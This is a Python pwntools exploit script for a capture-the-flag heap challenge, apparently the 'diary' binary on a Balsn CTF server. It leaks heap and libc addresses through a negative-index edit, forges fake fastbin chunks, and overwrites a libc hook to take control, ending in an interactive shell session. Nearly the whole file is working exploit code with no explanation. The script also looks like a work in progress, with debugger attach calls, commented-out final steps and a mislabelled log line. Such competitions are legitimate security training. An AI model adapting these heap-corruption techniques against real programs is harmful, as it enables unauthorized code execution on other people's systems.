from pwn import *
import sys
import os

remote_ip,port = 'diary.balsnctf.com','10101'
binary = ['./back']
#LIBC = ELF("./libc.so.6",checksec = False)

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)

if(len(sys.argv) > 1):
    io=remote(remote_ip,port)
    context.noptrace = True

else:
    io=process(binary,env = {"LD_PRELOAD" : "./libc.so.6"})

def choice(i):
    sla("choice : ",str(i))

def view_name():
    choice(1)

def add(size,data):
    choice(2)
    sa("Length : ",str(size))
    sa("Content : ",data)

def view(idx):
    choice(3)
    sa("Page : ",str(idx))

def edit(idx,data):
    choice(4)
    sa("Page : ",str(idx))
    sa("Content : ",data)

def free(idx):
    choice(5)
    sa("Page : ",str(idx))

if __name__ == "__main__":
    sla("name : ",'a'*0x1f)
    """
    for i in range(7):
        add(0x60,"aaa")
        free(i)
    add(0x60,"aaa")
    add(0x60,"aaa")
    free(7)
    free(8)
    gdb.attach(io)
    add(0x60,"aaa")
    """
    add(0x80,"aaaa")
    view_name()
    io.recvline()
    heap = u64(io.recv(6)+"\x00\x00")-0x260
    log.info("libc @ "+str(hex(heap)))
    payload ="\x00"*4+ p64(heap+0x288)*66 + p64(0)+p64(0x71)+p64(0)+p64(0)*3+p64(1)+p64(0)*2 + p64(heap+0x580) + p64(heap+0x5b0)+ p64(heap+0x6b0) + p64(heap+0x5a0)
    free(0)
    for i in range(3):
        add(0x80,"aaaa")
        free(i+1)
    #pay3 = "\x00"*4 + p64(0)*2 + p64(0x71)+p64(heap+0x5a0)
    add(0x80,"aaaa")
    free(4)
    pay2 ="\x00"*4+ p64(0)*2+p64(0x71)+p64(heap+0x560)+p64(0)*2+p64(0x71)+p64(heap+0x660)+p64(0)*2 +p64(0x41)
    add(0x80,pay2)     #fake chunk in this
    free(5)
    another_payload = "\x00"*4 + p64(0)*2+p64(0x71)+p64(heap+0x680)+p64(0)*2 + p64(0x71)+p64(heap+0x700)+p64(0)*2 + p64(0)*2 + "\x61"
    add(0x80,"bbbbb")
    add(0x80,another_payload)
    add(0x60,"aaaa")  # fastbin looper
    free(7)
    free(6)
    edit(-6,payload)
    payload = "\x00"*4 + p64(0)*2+p64(0x71)+p64(heap+0x540) + "\x53"
    add(0x25,payload)
    add(0x40,"aaaa")
    view(10)
    io.recv(4)
    libc = u64(io.recv(6)+"\x00\x00")-0x1e4ca0
    log.info("libc @ "+str(hex(libc)))
    hook = libc + 0x1e4c18
    payload = "\x00"*4 + p64(0)*4 + p64(0x71)+ p64(hook)+p64(heap+0x10)+p64(0)+p64(0x71)+p64(heap+0x6e0)
    free(8)
    add(0x53,payload)
    gdb.attach(io)
    add(0x60,"aaaa")
    #pay4 = "\x00"*4 +p64(libc+0x106ef8)
    #add(0x60,pay4)
    io.interactive()
